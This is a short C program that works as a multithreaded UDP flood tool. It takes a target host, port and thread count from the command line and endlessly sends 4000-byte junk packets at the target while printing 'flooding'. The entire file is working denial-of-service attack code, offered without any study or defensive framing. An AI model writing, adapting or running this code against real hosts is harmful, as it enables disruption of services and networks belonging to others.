#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>

int port;
char *req;
char *tgtip;
char *useragent;
struct timeval tv;
struct sockaddr_in sa; 

int makesa() {
 struct hostent *host;
 host = gethostbyname(tgtip); 
 sa.sin_addr.s_addr = *((unsigned int *)host->h_addr);
 sa.sin_port = htons(port); 
 sa.sin_family = AF_INET;
}

void *dosg(void *unused) {
 int fd = socket(AF_INET, SOCK_DGRAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 sendto(fd, req, strlen(req), MSG_NOSIGNAL, (struct sockaddr *)&sa, sizeof(sa)); 
 close(fd);
}

int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 makesa();
 dprintf(1, "flooding");
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dosg, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 req = malloc(4000);
 memset(req, 'a', 4000);
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 3) {
  dprintf(1, "ip/domain port threads\n");
  return 0;
 }
 tgtip = argv[1];
 port = atoi(argv[2]);
 make_threads(atoi(argv[3]));
}
